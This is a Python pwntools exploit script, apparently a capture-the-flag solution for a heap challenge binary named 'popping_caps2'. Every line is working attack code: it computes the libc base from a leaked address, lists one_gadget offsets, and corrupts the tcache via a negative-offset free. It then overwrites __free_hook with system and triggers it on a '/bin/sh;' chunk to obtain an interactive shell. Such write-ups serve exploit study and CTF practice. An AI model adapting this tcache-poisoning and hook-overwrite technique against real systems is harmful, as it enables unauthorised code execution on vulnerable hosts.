from pwn import *

libc = ELF('./libc.so.6')
context.arch = 'amd64'

def add(size):
	r.sendlineafter(':', '1')
	r.sendlineafter(':', str(size))

def free(offset):
	r.sendlineafter(':', '2')
	r.sendlineafter(':', str(offset))

def write(content):
	r.sendlineafter(':', '3')
	r.sendafter(':', content)

def bye():
	r.sendlineafter(':', '4')

def DEBUG():
	gdb.attach(r)

r = process('./popping_caps2')

r.recvuntil('0x')
libc_base = int(r.recvn(12), 16) - libc.symbols['system']
print "libc_base @ ", hex(libc_base)
one_gadget = [0x4f2c5, 0x4f322, 0x10a38c]
one_shot = libc_base + one_gadget[2]
free_hook = libc_base + libc.symbols['__free_hook']
print "free_hook @ ", hex(free_hook)
system = libc_base + libc.symbols['system']
print "system @ ", hex(system)

add(0x10)
free(-0x250)
add(0x240)
write('\x00'*0x40+p64(free_hook-0x8))
add(0x10)
write("/bin/sh;"+p64(system))
free(0)

r.interactive()